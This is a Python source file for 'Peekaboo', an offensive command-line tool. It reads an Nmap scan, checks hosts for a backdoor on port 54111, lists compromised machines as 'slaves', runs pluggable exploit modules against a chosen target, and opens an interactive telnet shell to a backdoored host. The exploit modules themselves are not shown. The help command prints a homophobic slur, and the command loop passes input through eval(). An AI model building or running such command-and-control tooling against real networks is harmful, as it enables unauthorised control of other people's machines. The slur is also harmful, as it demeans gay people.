import subprocess
import sys
import xmltodict
import socket
import os
import telnetlib
import getpass ##

from utils import *


PROG_NAME = 'Peekaboo'

TARGET = None
LOCALHOST = None

MODULE = None
MODULES = {}
SESSION = None

BACKDOOR_PORT = 54111

WORKING = os.path.abspath('.')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# peekaboo modules
#
# e.g bruteforce.py
# Must define class as captialized name of file (class Bruteforce)
# No __init__ for class
# funcs to implement:
# selected() => ask for user needed params and set everything to go
# run() => execute module and wait for response if successful or failed
# 

class Host:
    def __init__(self, host_dict):
        self.ip_addr = host_dict['address']['@addr']
        self.online = False
        self.backdoor = False
        self.ports = []

        try:
            ports_dict = host_dict['ports']['port']
            if not isinstance(ports_dict, list):
                ports_dict = [ports_dict]

            for port_dict in ports_dict:
                self.ports.append(Port(port_dict))
        except: 
            pass
            
class Port:
    def __init__(self, port_dict):
        self.number = port_dict['@portid']
        self.protocol = port_dict['@protocol']
        self.state = port_dict['state']['@state']
        self.service = port_dict['service']['@name']

def load_modules():

    module_files = os.listdir(MODULES_DIR)
    module_names = []

    for module_file in module_files:
        module_name, ext = os.path.splitext(module_file)
        if ext == '.py':
            module_names.append(module_name)
        
    sys.path.append(MODULES_DIR)

    print(f'Detecting Modules...')

    global MODULES
    global MODULE
    MODULES = {}
    for module_name in module_names:
        print(f'Trying to load ({module_name}) Module?: ', end='')
        try:
            if module_name in sys.modules:
                del sys.modules[module_name]
            module = __import__(module_name)
            mclass = getattr(module, module_name.upper())
            MODULES.update({module_name.upper(): mclass})
            if MODULE != None:
                if MODULE.name() == module_name.upper():
                    MODULE = mclass()

            print(f'{bcolors.OKGREEN}Loaded{bcolors.ENDC}')
        except Exception as e:
            print(f'{bcolors.FAIL}Failed{bcolors.ENDC}')
            print(e)

    print(f'Detected {len(module_names)} Modules, Loaded {len(MODULES.keys())} Modules')


def test_module():
    global MODULE    
    MODULE.test_func()

def detect_backdoor(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    endpoint = (host.ip_addr, BACKDOOR_PORT)
    host.backdoor = not sock.connect_ex(endpoint)
    sock.close()

def do_ping(host):
    return do_advanced_command(['ping', '-c 1', host.ip_addr])

def get_hostnames():
    return do_simple_command(['hostname', '-I'])
    
def do_simple_command(cmd):
    b_out = subprocess.check_output(cmd)
    return b_out.decode('UTF-8').strip()

def do_advanced_command(cmd):
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    b_out, b_err = proc.communicate()
    return (b_out.decode('UTF-8').strip(), b_err.decode('UTF-8').strip(), proc.returncode)

def do_nothing():
    pass

def list_targets(hosts):
    print('{: <15} {: <15} {: <15}'.format('IDX', 'Host', 'Backdoored?'))
    for num, host in enumerate(hosts):
        if host.backdoor:
            print('{: <15} {: <15} {: <15}'.format(num+1, host.ip_addr, f'{bcolors.OKGREEN}Yes{bcolors.ENDC}'))
        else:
            print('{: <15} {: <15} {: <15}'.format(num+1, host.ip_addr, f'{bcolors.FAIL}No{bcolors.ENDC}'))

def list_modules():
    global MODULES
    print('{: <15} {: <15}'.format('IDX', 'Module'))
    for num, module_name in enumerate(MODULES.keys()):
        print('{: <15} {: <15}'.format(num+1, module_name))

def list_slaves(hosts):
    print('{: <15} {: <15}'.format('IDX', 'Slave'))
    for num, host in enumerate(hosts):
        if host.backdoor:
            print('{: <15} {: <15}'.format(num+1, host.ip_addr))

def select_target(hosts, args):

    # select either a list num or ip addr for target
    # must be from list
    # vaildate num or ip

    if len(args) > 1:
        print('[select target] Remove unneeded arguments...')
        print('[select target] Nothing was selected')
    elif len(args) < 1:
        print('[select target] Must specify list number or ip address for target...')
        print('[select target] Nothing was selected')
    else:
        target = args[0]
        target_host = None
        # smallest (in terms of length) ip is 0.0.0.0, 1.1.1.1, etc
        if target.count('.') == 3 and len(target) >= 7:
            for host in hosts:
                if host.ip_addr == target:
                    target_host = host
        elif target.count('.') == 0:
            try:
                num = int(target)-1
                if num >= 0 and num < len(hosts):
                    target_host = hosts[num]
            except ValueError:
                pass
                    
        if target_host != None:
            global TARGET
            TARGET = target_host
        else:
            print('[select target] Invaild input')
            print('[select target] Nothing was selected')

def select_module(args):
     
    global MODULES
    global TARGET

    if TARGET == None:
        print('[select module] Target has not be selected...')
        print('[select module] Nothing was selected')
    elif len(args) > 1:
        print('[select module] Remove unneeded arguments...')
        print('[select module] Nothing was selected')
    elif len(args) < 1:
        print('[select module] Must specify idx number or module name...')
        print('[select module] Nothing was selected')
    else:
        module_selector = args[0]
        selected_module = None
        try:
            num = int(module_selector)-1       
            if num >= 0 and num < len(MODULES):
                key = list(MODULES.keys())[num]
                selected_module = MODULES[key]
        except ValueError:
            for key in MODULES.keys():
                if module_selector == key:
                    selected_module = MODULES[key]
                
        if selected_module != None:
            global MODULE
            MODULE = selected_module()
        else:
            print('[select module] Invaild input')
            print('[select module] Nothing was selected')

def session_target():
    global TARGET
    if TARGET == None:
        print('[session target] No target to connect to...')
    elif TARGET != None and not TARGET.backdoor:
        print('[session target] Target has no backdoor...')
    else:
        with telnetlib.Telnet(TARGET.ip_addr, BACKDOOR_PORT) as tn:
#            while 1:
#                try:
                tn.interact()
                tn.close()
                    #print(tn.read_all().decode('ascii'))
                    #cmd = input('cmd:')
                    #tn.write(cmd.encode('ascii') + b'\n')
#                except KeyboardInterrupt:
#                    break

        
def info_target(hosts, args):
    
    # info either a list num or ip addr or already selected target


    global TARGET
    target_host = None

    if len(args) == 0 and TARGET != None:
        target_host = TARGET
    elif len(args) == 0 and TARGET == None:
        # err
        print('[info target] No selected target or argument was passed. Must specify list num, ip addr, or already selected target')
    elif len(args) > 1:
        # err
        print('[info target] Remove unneeded arugments')
    else:
        target = args[0]
        # smallest (in terms of length) ip is 0.0.0.0, 1.1.1.1, etc
        if target.count('.') == 3 and len(target) >= 7:
            for host in hosts:
                if host.ip_addr == target:
                    target_host = host
        elif target.count('.') == 0:
            try:
                num = int(target)-1
                if num >= 0 and num < len(hosts):
                    target_host = hosts[num]
            except ValueError:
                pass
                    
    if target_host != None:
        print(f'Host ({target_host.ip_addr})')
        print('{: <15} {: <15} {: <15} {: <15}'.format('Port', 'Protocol', 'State', 'Service'))
        for port in target_host.ports:
            print('{: <15} {: <15} {: <15} {: <15}'.format(port.number, port.protocol, port.state, port.service))
    else:
        print('[info target] Invaild input')
    
    
def run_module():
    global MODULE
    global TARGET
    global LOCALHOST
    
    if TARGET != None and MODULE != None:
        try:
            MODULE.selected(LOCALHOST, TARGET)
            MODULE.run()
        except Exception as e:
            print(e)
    else:
        print('[run module] Module and Target must be selected...')

def peekaboo_banner():

    banner = '''
                 _         _                 
 _ __   ___  ___| | ____ _| |__   ___   ___  
| '_ \ / _ \/ _ \ |/ / _` | '_ \ / _ \ / _ \ 
| |_) |  __/  __/   < (_| | |_) | (_) | (_) |
| .__/ \___|\___|_|\_\__,_|_.__/ \___/ \___/ 
|_|                                          

    '''

    
    print(banner)

def peekaboo_help():
    print('ur gay')


def main():

    if len(sys.argv) != 2:
        print('Nmap scan needed')
        print('Exiting...')
        sys.exit(1)

    XML_nmap_capture_file = sys.argv[1]
    
    with open(XML_nmap_capture_file, 'r') as f:
        XML_nmap_capture_data = xmltodict.parse(f.read())

    nmap_capture = XML_nmap_capture_data['nmaprun']
    nmap_capture_hosts = nmap_capture['host']

    hosts = []
    parsed_host_amt = 0

    
    for host in nmap_capture_hosts:
        if host['status']['@state'] == 'up':
            hosts.append(Host(host))
            parsed_host_amt += 1    
    
    user_cmd = None

    '''
        list targets 
        - lists all hosts in nmap capture file (No args)
        
        select target
        - select target from hosts (1 arg: num or ip)

        info target
        - prints port scan of target (1 arg: num or ip)

        list modules
        - lists all attack/exploit methods (No args)
 
        select module
        - selects module from modules  (1 arg: num or name)
    
        run module
        - runs selected module (No args)

        list slaves (No args)
        - lists all hosts with listening port Backdoor

        info slave (1 arg: num or ip)
        - prints system info of slave

        select slave (1 args: num or ip)
        - selects backdoored host for hosts
        
        session slave
        - Connects to backdoored host and gives terminal
        


    '''

    cmd_dict = {
        ('list', 'targets'): 'list_targets(hosts)',
        ('select', 'target'): 'select_target(hosts, args)',
        ('info', 'target'): 'info_target(hosts, args)',
        ('reload', 'modules'): 'load_modules()',
        ('test', 'module'): 'test_module()',
        ('list', 'modules'): 'list_modules()',
        ('select', 'module'): 'select_module(args)',
        ('run', 'module'): 'run_module()',
        ('list', 'slaves'): 'list_slaves(hosts)',
        ('select', 'slave'): '',
        ('info', 'slave'): '',
        ('session', 'target'): 'session_target()',
        ('help', ): 'peekaboo_help()',
        (): 'do_nothing()'
    }

    peekaboo_banner()

    hostnames_str = get_hostnames()
    hostnames = hostnames_str.split()

    print(f'Your Hostnames are: {bcolors.HEADER}{hostnames_str}{bcolors.ENDC}\n')

    load_modules()

    print()

    print(f'Using NMAP XML file: {XML_nmap_capture_file}')    
    print(f'Parsed {parsed_host_amt} hosts from {XML_nmap_capture_file}')

    # removes localhost from nmap capture
    for host in hosts:
        for hostname in hostnames:
            if host.ip_addr == hostname:
                print(f'{bcolors.WARNING}Removed Localhost ({host.ip_addr}) from Hosts{bcolors.ENDC}')
                parsed_host_amt -= 1
                hosts.remove(host)
                global LOCALHOST
                LOCALHOST = host
    print()

    print('Pinging each Host to confirm online status...')

    up_host_amt = 0

    for host in hosts:
        print(f'Is Host ({host.ip_addr}) Up?: ', end='')
        out, err, code = do_ping(host)
        if not code:
            print(f'{bcolors.OKGREEN}Yes{bcolors.ENDC}')
            host.online = True
            up_host_amt += 1
        else:
            print(f'{bcolors.FAIL}No{bcolors.ENDC}')
        
    print(f'Pinged {parsed_host_amt} Hosts, {up_host_amt} hosts responded\n')


    print(f'Detecting existing Backdoors (PORT: {BACKDOOR_PORT}) on online Hosts...')

    bd_host_amt = 0

    for host in hosts:
        if host.online:
            print(f'Is Host ({host.ip_addr}) Backdoored?: ', end='')
            detect_backdoor(host)
            if host.backdoor:
                print(f'{bcolors.OKGREEN}Yes{bcolors.ENDC}')
                bd_host_amt += 1
            else:
                print(f'{bcolors.FAIL}No{bcolors.ENDC}')
    
    if bd_host_amt == 0:
        print('No Hosts are Backdoored :(\n')
    else:
        print(f'{bd_host_amt} Hosts are Backdoored!\n')
            

    while user_cmd == None:
        try:

            cmd_cursor = f'{PROG_NAME} >> '

            if TARGET != None:
                cmd_cursor = f'{PROG_NAME} {bcolors.OKBLUE}T({TARGET.ip_addr}){bcolors.ENDC} >> '       

            if TARGET != None and MODULE != None:
                cmd_cursor = f'{PROG_NAME} {bcolors.OKBLUE}T({TARGET.ip_addr}){bcolors.ENDC} {bcolors.OKGREEN}M({MODULE.name()}){bcolors.ENDC} >> ' 
       
            user_cmd = input(cmd_cursor).split()
            user_cmd = tuple(user_cmd)
            
            cmd = user_cmd[0:2]
            #print(cmd)
            args = user_cmd[2:len(user_cmd)]
 
            if cmd in cmd_dict.keys():
     
                out = cmd_dict[cmd]
                
                eval(out)
            
            else: 
                print('Unknown Command :( Type help for a list of available commands')

            user_cmd = None        

        except KeyboardInterrupt:
            print('\nQuiting...')
            break


if __name__ == '__main__':
    main()













